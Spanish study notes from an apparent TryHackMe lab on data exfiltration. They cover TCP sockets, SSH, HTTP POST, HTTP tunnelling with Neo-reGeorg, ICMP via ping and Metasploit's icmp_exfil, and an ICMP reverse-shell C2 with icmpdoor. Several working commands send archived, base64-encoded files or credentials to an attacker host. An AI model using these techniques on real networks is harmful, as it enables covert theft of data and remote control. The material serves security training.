# Filtración Datos

# Objetivos de Aprendizaje

- Que es la filtración de datos?
- Entender la filtració nde datos y como se usa
- Practicas protocolos: Sockets, SSH, ICMP, HTTP(s) y DNS
- Practicas comunicaciones con C2 o varios protocolos
- Practicar entablar Tueneles del DNS y HTTP

# Infraestructura de red

![image](https://github.com/user-attachments/assets/d21197ed-d328-4357-8d08-ad0c560eb1ac)

# Filtración de datos

Filtración de datos es el proceso de coger o copiar datos sensibles sin autorización de dentro de una organización o red para fuera. Es importante anotar que este tipo de filtarción compromete el proceso y da también acceso a la red dando varios accesos y datos sensibles.

Se puede denominar como información sensible:

- Usuarios y contraseñas
- Detalles de cuentas
- Estrategias de negocio
- Llaves criptograficas
- Empleados y información personal
- Projeto de codigo de datos

## Como se puede hacer

Hay teres casos o escenarios

- Filtración de datos
- C2
- Tuneling

### Tradicional

Es simplemente mover datos de dentro de la red a fuera.

### C2

Mover los datos a traver de un C2

### Tunneling

Mover a traves de un canal de comunicaciones creado

# Filtración Usando Sockets TCP

Esta exfiltración es muy fácil de detectar si tenemos los protocolo bien configurados.

Dentras de los TCP sockets, tenemos varias tectnicas, incluyendo codificación de datos y archivar. Uno de los beneficios de estas tecnicas es codificar los datos durante la transmisión y hacer que sea más dificil examinar.

El siguiente diagrama explicar como las comunicaciones TCP funcionan.

![image](https://github.com/user-attachments/assets/b2c034f1-1987-41c6-bafe-3ef31446c30a)

1- Primero de todo nos Conectamos via el puerto 1337
2- La otra maquina se conecta al puerto especifico. Por ejemplo un nc 1.2.3.4 1337
3- La primera máquina entabla conexión
4- Finalmente, se mandan los datos y se reciben los resultados

Las comunicaciones TCP requieren obviamente dos máquinas, una victima y una tacante, que transfiere los datos. Vamos a usar el entorno de red para practicar

Necesitaremos preapar un listener a un puerto espeficio

```
nc -lvnp 8080 > /rmp/task4-creds.data
```

Estamos haciendo que recibamos los datos por el 8080, una vez recibidos se guarden el archivo que hemos marcado

Vamos a conectar la máquina victima que cuente los datos y transmitir lo que necesitamos

```
ssh thm@ip -p 2022
```
thm:tryhackme

Nosotros necesitamos los datos transmitidos en este caso

```
cat task4/creds.txt
```
Transpasar los datos:

```
tar zcf - task4/ | base64 | dd conv=ebcdic > /dev/tcp/192.168.0.133/8080
```

```
thm@jump-box$ nc -lvp 8080 > /tmp/task4-creds.data
Listening on [0.0.0.0] (family 0, port 8080)
Connection from 192.168.0.101 received!

thm@jump-box$ ls -l /tmp/
-rw-r--r-- 1 root root       240 Apr  8 11:37 task4-creds.data
```

Descomprimimos

```
tar xvf credenciales
```

# Filtración Usando SSH

Para transferir datos vía ssh utilizaremos el protocolo "SCP" 

Vamos a usar la misma técnica de los sockets TCP, pero usaremos este comando

```
tar cf - task5/ | ssh thm@jump.thm.com "cd /tmp/; tar xpf -"
```

# Filtración Usando HTTP(s)

### HTTP POST Request

Esto es de los mejores protocolos para usar. Porque no se puede distinguir de un tráfico malicioso o no. Para eso usaremos el metodo POST HTTP.

```
thm@jump-box:~$ ssh thm@web.thm.com
thm@web-thm:~$ sudo cat /var/log/apache2/access.log
[sudo] password for thm:
10.10.198.13 - - [22/Apr/2022:12:03:11 +0100] "GET /example.php?file=dGhtOnRyeWhhY2ttZQo= HTTP/1.1" 200 147 "-" "curl/7.68.0"
10.10.198.13 - - [22/Apr/2022:12:03:25 +0100] "POST /example.php HTTP/1.1" 200 147 "-" "curl/7.68.0"
```

Simplemente necesitamos una página PHP que indice que puede recibir consultas HTTP

Vamos a preparar un pequeño webserver

```
<?php 
if (isset($_POST['file'])) {
        $file = fopen("/tmp/http.bs64","w");
        fwrite($file, $_POST['file']);
        fclose($file);
   }
?>
```

Nos vamos a la máquina victima

```
curl --data "file=$(tar zcf - task6 | base64)" http://web.thm.com/contact.php
```

```
thm@victim1:~$ ssh thm@web.thm.com 
thm@web:~$ ls -l /tmp/
total 4
-rw-r--r-- 1 www-data www-data 247 Apr 12 16:03 http.bs64
thm@web:~$ cat /tmp/http.bs64
H4sIAAAAAAAAA 3ROw7CMBBFUddZhVcA/sYSHUuJSAoKMLKNYPkkgSriU1kIcU/hGcsuZvTysEtD<
WYua1Ch4P9fRss69dsZ4E6wNTiitlTdC qpTPZxz6ZKUIsVY3v379P6j8j3/8ejzqlyrrDgF3Dr3
On/XLvI3QVshVY1hlv48/64/7I bU5fzJaa 2c5XbazzbTOtvCkxpubbUwIAAAAAAAAAAAAAAAB4
5gZKZxgrACgAAA==
```

Nosotros necesitamos ahora sal el comando sed para poder ver el HTTP sin URL encoded

```
sudo sed -i 's/ /+/g' /tmp/http.bs64
```

## Comunicaciones HTTPs

Con HTTPs sabemos que todas las comunicaciones van encriptadas

## Tunel HTTP

Usaremos neo-reGerog 

```
/opt/Neo-reGeorg#
```
```
root@AttackBox:/opt/Neo-reGeorg# python3 neoreg.py generate -k thm                                                                                                                                                                              


          "$$$$$$''  'M$  '$$$@m
        :$$$$$$$$$$$$$$''$$$$'
       '$'    'JZI'$$&  $$$$'
                 '$$$  '$$$$
                 $$$$  J$$$$'
                m$$$$  $$$$,
                $$$$@  '$$$$_          Neo-reGeorg
             '1t$$$$' '$$$$<
          '$$$$$$$$$$'  $$$$          version 3.8.0
               '@$$$$'  $$$$'
                '$$$$  '$$$@
             'z$$$$$$  @$$$
                r$$$   $$|
                '$$v c$$
               '$$v $$v$$$$$$$$$#
               $$x$$$$$$$$$twelve$$$@$'
             @$$$@L '    '<@$$$$$$$$`
           $$                 '$$$


    [ Github ] https://github.com/L-codes/neoreg

    [+] Mkdir a directory: neoreg_servers
    [+] Create neoreg server files:
       => neoreg_servers/tunnel.aspx
       => neoreg_servers/tunnel.ashx
       => neoreg_servers/tunnel.jsp
       => neoreg_servers/tunnel_compatibility.jsp
       => neoreg_servers/tunnel.jspx
       => neoreg_servers/tunnel_compatibility.jspx
       => neoreg_servers/tunnel.php
```

El anterior comando genera un tunel encriptado diciento al cliente que la llave se encuentra en un directorio

```
root@AttackBox:/opt/Neo-reGeorg# python3 neoreg.py -k thm -u http://10.10.103.17/uploader/files/tunnel.php
```

Por ejemplo si nosotros queremos acceder a un recurso via puerto 80, podemos usar el comando curl con un socker

```
curl --socks5 127.0.0.1:1080 http://172.20.0.121:80
```

![image](https://github.com/user-attachments/assets/b7d1d7fe-7912-4264-a204-a18e79b7d53f)

# Filtración Usando ICMP

El protocolo ICMP no es un protoclo de trasporte entre dispositivos. Se usa para testear conectvidades de la red usando el comando ping

![image](https://github.com/user-attachments/assets/b0a52e5c-2801-4349-a8a0-d6114f2f26d4)

## ICMP Data Section

La estructura del paquete ICMP contiene una sección de datos incluyendo string o copias de otra información como una cabecera IPv4, usando mensajes de error.

![image](https://github.com/user-attachments/assets/ac4b050a-638a-4923-9492-b6b141259bba)

Este archivo de datos es opcional porque puede contener un random string durante las comunicaciones. Un atacante, puede usar esta estructura para incluid datos en la sección "Data" via ICMP a otra máquina.

```
ping ip -c 1
```

Elegimos mandar el paquete al HOst 1 usando -c 1

![image](https://github.com/user-attachments/assets/6652e95d-1fd2-4451-963c-463588d9ce42)

Con el argumento -p, especificamos 16 bytes de datos en representación Hexadecimal que mandamos como paquete. Solo esta disponible en sistemas Linux. 

![image](https://github.com/user-attachments/assets/744d69db-180a-462b-99dd-2ef8926ad72a)

Vamos a utilizarlo para filtrar por ejemplo credenciales. Vamonos a una máquina Victima y otra máquina atacante, vamos a crear unas credenciales y pasarlas a hexadecimal

```
echo "nodo:nodo313" | xxd -p
6e6f646f3a6e6f646f3331330a
```

Metemos un ping a la ip en cuestión

```
ping ip -c 1 -p 6e6f646f3a6e6f646f3331330a
```

Vamos a ver el paquete 

![image](https://github.com/user-attachments/assets/ab6d03dd-87f3-4748-868a-7aa54043c82c)

Ahora que tenemos la secció nde datos podemos ver los datos, locura eh

# Filtración de datos con ICMP

Ahora que tenemos lo fundamental en mandar datos vía paquetes ICMP, vamo sa utilizar metasploit para usar la misma tecnica, sin embargo, caputarndo los paquetes en el momento. Una vez recibidos de decodifica los datos y te los muestra.

```
msfconsole
use auxiliary/server/icmp_exfil
set BPF_FILTER icmp and not src tu_ip
```

```
set INTERFACE tuya
run
```

Una vez preparados, deberemos tener instalado también esta herramienta: [nping](https://nmap.org/nping/)

Simplemente es una herramienta open-source de generación de paquetes, analisis de respuesta, y tiempo de respuesta, parte de la suite de NMAP

Mandaremos un trigger BOF (Beacon Objetc Files) UN set de codigo compilado escrito en c que interactua con las API de windows

```
sudo nping --icmp -c 1 ip --data-string "admin:admin"    
Starting Nping 0.7.80 ( https://nmap.org/nping ) at 2022-04-25 23:23 EEST
SENT (0.0369s) ICMP [192.168.0.121 > ATTACKBOX_IP Echo request (type=8/code=0) id=7785 seq=1] IP [ttl=64 id=40595 iplen=39 ]
RCVD (0.0376s) ICMP [ATTACKBOX_IP > 192.168.0.121 Echo reply (type=0/code=0) id=7785 seq=1] IP [ttl=63 id=12656 iplen=39 ]
RCVD (0.0755s) ICMP [ATTACKBOX_IP > 192.168.0.121 Echo reply (type=0/code=0) id=7785 seq=1] IP [ttl=31 id=60759 iplen=32 ]
    
Max rtt: 38.577ms | Min rtt: 0.636ms | Avg rtt: 19.606ms
Raw packets sent: 1 (39B) | Rcvd: 2 (71B) | Lost: 0 (0.00%)
Nping done: 1 IP address pinged in 1.06 seconds
```

Mandamos paquetes ICMP usando nping con el argumento "--data-string". Especificamos que el valor del triger con el nombre "BOFfile.txt"

Vamonos a nuestra máquina. Si esta todo correcto metasploit habra guardado dicho valor

![image](https://github.com/user-attachments/assets/db83fede-4359-4392-8690-22d730313744)

Vamos a Donde meta que esta

```
cat /root/.msf4/loot/20250120093300_default_10.10.57.254_icmp_exfil_801837.txt
admin:admin
```

## Comunicaciones C2 ICMP

La siguiente herramienta que utilizaremos sera [ICMPdoor](https://github.com/krabelize/icmpdoor). Un código abierto que escriber rev-shells en python3 y scrapy. 

![image](https://github.com/user-attachments/assets/4dfa44db-4ef9-4fe7-b59e-142bc8685229)

Vamos a prepararnos con las herramientas necesarias, primero deberemos logearnos en la máquina "victima" y ejecutar el icmpdoor

```
sudo icmpdoor -i eth0 -d 192.168.0.133
```

Nos iremos 

```
sudo icmp-cnc -i eth1 -d  ip
```

![image](https://github.com/user-attachments/assets/ecde5870-8223-45d1-b327-bd6b40761766)

Podemos capturar si queremos el trafico y ver como funciona realmente

![image](https://github.com/user-attachments/assets/03f5a463-d881-47ef-a704-26b2aeb0b0af)

# Configuración DNS

Para hacer una exfiltración via DNS, necesitamos control del nombre de dominio y activas los records, incluyendo NS, A o TXT. 





